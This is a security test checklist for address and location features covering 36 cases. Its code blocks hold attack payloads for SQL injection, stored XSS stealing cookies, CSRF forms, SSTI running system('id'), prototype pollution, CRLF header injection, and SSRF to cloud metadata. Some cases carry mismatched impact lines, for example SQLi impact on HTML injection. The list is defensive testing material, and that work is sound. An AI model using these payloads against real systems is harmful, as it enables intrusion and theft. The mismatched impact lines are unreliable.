# 7. Address & Location — Checklist

Feature-area security **test cases** for “7. Address & Location”. Functionality-driven checklist mapped to the per-attack kits; impact-first with severity + CVSS.

*138 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## ADDR-001 — IDOR on Adding Address to Another User Account
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. Login as User A and add a new address. 2. Intercept the request and change user_id to User B. 3. Submit the request. 4. Login as User B and check if the address was added to their account.

**Expected Result:** Application must validate that the authenticated user can only add addresses to their own account and reject cross-user modifications.

**Payload Example:**

```
Change user_id=1001 to user_id=1002 in POST /api/addresses body
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADDR-002 — IDOR on Editing Another User Address
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. Login as User A and edit own address. 2. Intercept the PUT/PATCH request and change address_id to an address belonging to User B. 3. Submit and verify if User B's address is modified.

**Expected Result:** Application must verify ownership of the address before allowing any edit operation.

**Payload Example:**

```
Change PUT /api/addresses/ADDR-1001 to PUT /api/addresses/ADDR-1002 with User A token
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADDR-003 — IDOR on Deleting Another User Address
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. Login as User A and delete own address. 2. Intercept the DELETE request and change address_id to User B's address. 3. Submit and verify if User B's address is deleted.

**Expected Result:** Application must verify that the authenticated user owns the address before allowing deletion.

**Payload Example:**

```
Change DELETE /api/addresses/ADDR-1001 to DELETE /api/addresses/ADDR-1002
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADDR-004 — SQL Injection in Address Fields
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. Add or edit an address. 2. Inject SQL payloads in fields like street_address or city or state or zip_code. 3. Submit and observe the response for SQL errors or data leakage.

**Expected Result:** Application must use parameterized queries for all address-related database operations and never concatenate user input into SQL.

**Payload Example:**

```
street_address=123 Main St' OR 1=1--;city=TestCity' UNION SELECT username;password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADDR-005 — Stored XSS in Address Fields
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. Add a new address with XSS payload in street_address or name or city fields. 2. Save the address. 3. Navigate to address book or checkout page. 4. Check if script executes when the address is rendered.

**Expected Result:** Application must sanitize all address field inputs on storage and encode all outputs when rendering addresses in any context.

**Payload Example:**

```
street_address=<script>alert(document.cookie)</script>;name=<img src=x onerror=alert('XSS')>;city=<svg/onload=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ADDR-006 — CSRF on Address Addition
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. Craft a malicious HTML page that auto-submits an add address request with attacker's address details. 2. Lure an authenticated victim to visit the page. 3. Check if the attacker's address is added to the victim's account.

**Expected Result:** Application must implement and validate anti-CSRF tokens on all address management operations.

**Payload Example:**

```
<form action='https://target.com/api/addresses' method='POST'><input name='street' value='Attacker Street'><input name='city' value='Evil City'></form><script>document.forms[0].submit()</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## ADDR-007 — CSRF on Address Deletion
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. Craft a malicious page that sends a DELETE request for the victim's address. 2. Have the victim visit the page while authenticated. 3. Check if the address is deleted.

**Expected Result:** Application must validate CSRF tokens on all destructive operations including address deletion.

**Payload Example:**

```
<img src='https://target.com/api/addresses/ADDR-1001/delete'> or auto-submit DELETE form
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## ADDR-008 — Mass Assignment on Address Object
**Test Category:** Mass Assignment (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. Add a new address with normal fields. 2. Inject additional parameters like is_verified=true or is_admin_address=true or user_id=9999 in the request body. 3. Check if hidden fields are accepted.

**Expected Result:** Application must whitelist only allowed address fields and ignore any unexpected or unauthorized parameters in the request.

**Payload Example:**

```
Add is_verified=true&is_primary=true&user_role=admin&account_id=9999 to POST /api/addresses body
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite;Postman

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## ADDR-009 — Address Field Length Overflow
**Test Category:** Input Validation (WSTG-INPV-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. Add an address with extremely long values in each field. 2. Submit street_address with 100000+ characters. 3. Observe server behavior for crashes or truncation issues or buffer overflow.

**Expected Result:** Application must enforce reasonable maximum length limits on all address fields and return appropriate validation errors.

**Payload Example:**

```
street_address=A*100000;city=B*50000;state=C*50000;zip_code=D*50000
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## ADDR-010 — HTML Injection in Address Fields
**Test Category:** Injection (WSTG-INPV-03) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. Add an address with HTML tags in fields like street_address or name. 2. Save and view the address in different contexts like checkout or order confirmation or admin panel. 3. Check for content injection.

**Expected Result:** Application must sanitize HTML tags in address fields and render content as plain text.

**Payload Example:**

```
street_address=<h1>HACKED</h1><a href='https://evil.com'>Click Here</a>;name=<marquee>Injected</marquee>
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Browser

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADDR-011 — NoSQL Injection in Address Fields
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. If backend uses NoSQL database inject NoSQL payloads in address fields. 2. Submit and check for authentication bypass or data extraction.

**Expected Result:** Application must sanitize all inputs against NoSQL injection patterns and use parameterized queries.

**Payload Example:**

```
{"street_address":{"$gt":""};"city":{"$ne":null};"$where":"sleep(5000)"}
```

**Impact:** NoSQL operator injection -&gt; authentication bypass / cross-user data disclosure.

**Tools:** Burp Suite;NoSQLMap

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger NoSQL injection

---

## ADDR-012 — Unauthenticated Address Management
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. Capture an address add/edit/delete request. 2. Remove the session cookie or authorization token. 3. Replay the request without any authentication. 4. Check if the operation succeeds.

**Expected Result:** Application must require valid authentication for all address management endpoints.

**Payload Example:**

```
Remove Authorization: Bearer token or Cookie: session=abc from address API requests
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ADDR-013 — Address Enumeration via Sequential IDs
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. Note the format and pattern of address_id values. 2. Enumerate sequential address IDs using Burp Intruder. 3. Check if address details for other users are returned.

**Expected Result:** Application must use non-sequential unpredictable address identifiers and enforce authorization on every access.

**Payload Example:**

```
Enumerate GET /api/addresses/1 through GET /api/addresses/10000
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder;ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## ADDR-014 — Unlimited Address Creation for DoS
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. Script automated address creation requests. 2. Send thousands of add address requests for a single account. 3. Check if rate limiting exists or if storage is exhausted.

**Expected Result:** Application must implement rate limiting and maximum address count per account to prevent abuse.

**Payload Example:**

```
Send 10000 POST /api/addresses requests in rapid succession
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## ADDR-015 — CRLF Injection in Address Fields
**Test Category:** Injection (WSTG-INPV-15) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. Add an address with CRLF characters injected in address fields. 2. Check if HTTP headers are injected when the address is included in responses or emails.

**Expected Result:** Application must strip or encode CRLF characters in all address field inputs.

**Payload Example:**

```
street_address=123 Main St%0d%0aSet-Cookie:session=evil;city=Test%0d%0aX-Injected:true
```

**Impact:** CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-113; -&gt;[Host Header Injection checklist](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger

---

## ADDR-016 — Server-Side Template Injection in Address Fields
**Test Category:** Injection (WSTG-INPV-18) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. Add an address with SSTI payloads in fields like name or street_address. 2. Trigger any template rendering such as invoice generation or email confirmation. 3. Check if the template engine processes the payload.

**Expected Result:** Application must treat address data as plain text and escape template syntax before rendering.

**Payload Example:**

```
name={{7*7}};street_address=${7*7};city=<%= system('id') %>;state={{config.items()}}
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite;Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## ADDR-017 — Privilege Escalation via Address Admin Endpoint
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. As a regular user try accessing admin address management endpoints. 2. Attempt URLs like /api/admin/addresses or /api/admin/users/addresses. 3. Check if access is granted.

**Expected Result:** Application must enforce role-based access control and deny admin address endpoints to non-admin users.

**Payload Example:**

```
GET /api/admin/addresses;GET /api/admin/users/1002/addresses;DELETE /api/admin/addresses/ADDR-1001 with regular user token
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;DirBuster

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADDR-018 — HTTP Method Tampering on Address Endpoint
**Test Category:** HTTP Methods (WSTG-CONF-06) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. Send address management requests using unexpected HTTP methods like TRACE or OPTIONS or PUT on a POST-only endpoint. 2. Check if unintended methods are accepted.

**Expected Result:** Application must restrict HTTP methods to only those intended for each endpoint and return 405 Method Not Allowed for others.

**Payload Example:**

```
Send TRACE /api/addresses;PUT /api/addresses when only POST allowed;DELETE /api/addresses without specific ID
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;Postman

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## ADDR-019 — JSON Injection in Address Payload
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. Add an address and inject malformed JSON or additional JSON keys in the request body. 2. Check for parser confusion or unexpected behavior.

**Expected Result:** Application must strictly validate JSON structure and reject malformed or unexpected JSON payloads.

**Payload Example:**

```
{"street":"123 Main";"street":"456 Evil St"} or {"street":"test\";\"admin\":true;\""}
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADDR-020 — Prototype Pollution via Address Object
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Add / Edit / Delete Address

**Test Steps:** 1. If Node.js backend inject prototype pollution payloads in address JSON body. 2. Check for unexpected behavior or privilege escalation.

**Expected Result:** Application must sanitize incoming JSON objects and prevent prototype pollution attacks.

**Payload Example:**

```
{"__proto__":{"isAdmin":true};"constructor":{"prototype":{"role":"admin"}}}
```

**Impact:** Prototype pollution -&gt; DOM XSS (client) / RCE (server).

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-1321; -&gt;[Prototype Pollution checklist](#/checklist/prototype); Olivier Arteau; PortSwigger server-side PP

---

## ADDR-021 — IDOR on Setting Default Address for Another User
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Default Address Selection

**Test Steps:** 1. Set a default address for own account. 2. Intercept the request and change user_id or account_id to another user. 3. Check if the default address for another user is changed.

**Expected Result:** Application must verify that the authenticated user can only modify their own default address setting.

**Payload Example:**

```
Change PUT /api/addresses/default with user_id=1001 to user_id=1002
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADDR-022 — Setting Non-Owned Address as Default
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Default Address Selection

**Test Steps:** 1. Intercept the set default address request. 2. Change address_id to an address belonging to another user. 3. Submit and check if another user's address is set as your default.

**Expected Result:** Application must verify that the address being set as default belongs to the authenticated user.

**Payload Example:**

```
PUT /api/addresses/set-default with address_id=ADDR-2001 (belonging to User B) using User A token
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ADDR-023 — CSRF on Default Address Change
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Default Address Selection

**Test Steps:** 1. Craft a malicious page that changes the victim's default address to a previously added attacker-controlled address. 2. Lure victim to visit the page. 3. Check if default address changes.

**Expected Result:** Application must validate CSRF tokens on default address change requests.

**Payload Example:**

```
<form action='https://target.com/api/addresses/set-default' method='POST'><input name='address_id' value='ADDR-ATTACKER'></form><script>document.forms[0].submit()</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## ADDR-024 — Race Condition on Default Address Setting
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Default Address Selection

**Test Steps:** 1. Send multiple simultaneous requests to set different addresses as default. 2. Check for inconsistent state where multiple addresses are marked as default. 3. Verify data integrity.

**Expected Result:** Application must implement proper locking to ensure only one address is default at any time.

**Payload Example:**

```
Send 10 concurrent PUT /api/addresses/set-default with different address_ids
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## ADDR-025 — Bypassing Default Address Requirement
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Default Address Selection

**Test Steps:** 1. Delete all addresses including the default one. 2. Attempt to place an order without any default address. 3. Check if the application handles the missing default address gracefully.

**Expected Result:** Application must require a valid default address before allowing order placement and handle missing address scenarios with clear user prompts.

**Payload Example:**

```
DELETE all addresses then POST /api/orders without any address set
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-026 — Default Address Override During Checkout
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Default Address Selection

**Test Steps:** 1. Set a default address. 2. During checkout intercept the request and change the shipping_address_id to a different address or inject a new address. 3. Check if override is validated.

**Expected Result:** Application must validate that the shipping address used during checkout belongs to the authenticated user.

**Payload Example:**

```
Change shipping_address_id in checkout request to non-owned address_id or inject inline address bypassing stored addresses
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-027 — Bypassing Server-Side Address Validation
**Test Category:** Input Validation (WSTG-INPV-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Address Validation

**Test Steps:** 1. Enter an obviously invalid address like random characters or fictional location. 2. Bypass frontend validation by submitting directly via API. 3. Check if invalid address is accepted.

**Expected Result:** Application must perform server-side address validation independent of frontend checks and reject clearly invalid addresses.

**Payload Example:**

```
POST /api/addresses with street=aaaaaaa;city=xxxxx;state=zzz;zip=00000 directly via API bypassing UI
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite;Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## ADDR-028 — Address Validation Bypass via Encoding
**Test Category:** Input Validation (WSTG-INPV-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Address Validation

**Test Steps:** 1. Enter a valid-looking address but use URL encoding or Unicode characters to bypass validation patterns. 2. Submit and check if the address passes validation despite being invalid.

**Expected Result:** Application must normalize and decode all address inputs before validation to prevent encoding-based bypasses.

**Payload Example:**

```
street=%31%32%33%20%4D%61%69%6E;city=Test%00City;state=C%41 or use Unicode homoglyphs
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite;Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## ADDR-029 — SQL Injection via Address Validation Endpoint
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Address Validation

**Test Steps:** 1. Use the address validation endpoint to validate a new address. 2. Inject SQL payloads in the validation parameters. 3. Observe the response for SQL errors or data extraction.

**Expected Result:** Application must use parameterized queries for all address validation database lookups.

**Payload Example:**

```
POST /api/addresses/validate with city=' OR 1=1--;zip_code=12345' UNION SELECT * FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ADDR-030 — Validation Service SSRF
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Address Validation

**Test Steps:** 1. If address validation calls an external service intercept the request. 2. Modify the validation endpoint URL to an internal address. 3. Check if SSRF is possible.

**Expected Result:** Application must hardcode validation service URLs server-side and not accept client-provided validation endpoints.

**Payload Example:**

```
Change validation_url=https://api.validation.com to validation_url=http://169.254.169.254/latest/meta-data/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## ADDR-031 — Address Validation Timing Attack
**Test Category:** Information Disclosure (WSTG-INFO-01) · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Address Validation

**Test Steps:** 1. Submit valid and invalid addresses to the validation endpoint. 2. Measure response times. 3. Check if timing differences can be used to enumerate valid addresses or zip codes.

**Expected Result:** Application must ensure consistent response times for both valid and invalid address submissions to prevent timing-based enumeration.

**Payload Example:**

```
Compare response times for valid zip=10001 vs invalid zip=99999 across multiple requests
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADDR-032 — Denial of Service via Repeated Validation Requests
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Address Validation

**Test Steps:** 1. Send a large number of address validation requests in rapid succession. 2. Check if rate limiting is enforced. 3. Monitor for service degradation or third-party API abuse.

**Expected Result:** Application must implement rate limiting on validation endpoints to prevent abuse and excessive third-party API calls.

**Payload Example:**

```
Send 1000+ POST /api/addresses/validate requests per minute
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite Intruder;JMeter

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## ADDR-033 — Validation Response Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Address Validation

**Test Steps:** 1. Submit an invalid address for validation. 2. Intercept the validation response. 3. Change is_valid=false to is_valid=true. 4. Forward the response and check if the application proceeds with the invalid address.

**Expected Result:** Application must re-validate addresses server-side before processing and not rely solely on client-received validation results.

**Payload Example:**

```
Intercept validation response and change {"is_valid":false} to {"is_valid":true;"confidence":"high"}
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ADDR-034 — Special Characters in Validation Fields
**Test Category:** Input Validation (WSTG-INPV-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Address Validation

**Test Steps:** 1. Enter special characters in address validation fields including null bytes and control characters. 2. Check for unexpected behavior or error disclosure.

**Expected Result:** Application must handle special characters gracefully and not expose internal errors or crash.

**Payload Example:**

```
street=123\x00Main\x01St;city=Test\x0aCity;zip=123\r\n45
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite;Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## ADDR-035 — Geolocation Spoofing for Unauthorized Access
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Geolocation / Auto-detect

**Test Steps:** 1. Use browser developer tools or proxy to spoof geolocation coordinates. 2. Set location to a region with different pricing or restricted products. 3. Check if spoofed location is trusted.

**Expected Result:** Application must not solely rely on client-side geolocation for security-critical decisions like pricing or product availability.

**Payload Example:**

```
Spoof navigator.geolocation to lat=0.0;lng=0.0 or coordinates of a different pricing region
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Browser DevTools;Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## ADDR-036 — Geolocation API Data Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Geolocation / Auto-detect

**Test Steps:** 1. Trigger geolocation auto-detect. 2. Intercept the request to the backend. 3. Check if exact GPS coordinates are transmitted and stored. 4. Verify what precision of location data is sent.

**Expected Result:** Application must only collect and store the minimum necessary location precision and inform users about data collection.

**Payload Example:**

```
Check if exact lat=40.7128000;lng=-74.0060000 (high precision) is sent vs city-level approximation
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ADDR-037 — Geolocation Injection for Price Manipulation
